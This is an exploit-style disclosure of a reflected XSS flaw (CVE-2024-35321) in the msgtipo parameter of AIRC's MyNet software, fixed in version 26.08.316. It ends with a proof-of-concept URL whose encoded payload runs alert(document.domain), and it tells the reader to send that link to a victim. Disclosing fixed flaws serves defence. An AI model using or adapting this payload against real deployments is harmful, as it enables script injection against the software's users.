<h1>CVE-2024-35321</h1>
Exploit Title: MyNet | RXSS in msgtipo <= 26.08 fixed on version 26.08.316
Date: 10/05/2024
Exploit Author: André Monteiro & Manuel Tavares
Vendor Homepage: https://www.airc.pt/
Software Link: https://www.airc.pt/solucoes-servicos/solucoes?segment=MYN
Version: <= 26.08
Tested on: Google and Firefox latest version
CVE : CVE-2024-35321
Description
The msgtipo parameter in MyNet versions 26.08 and earlier is vulnerable to XSS by unauthenticated users due to insufficient input sanitization and output encoding.

Proof of Concept (PoC)
To reproduce the vulnerability, provide the victim with the following link containing the specific payload in the msg parameter. For example:

https://host.domain.pt/?msg=%5C&msgtipo=%2Calert%28document.domain%29%29%2F%2Fa
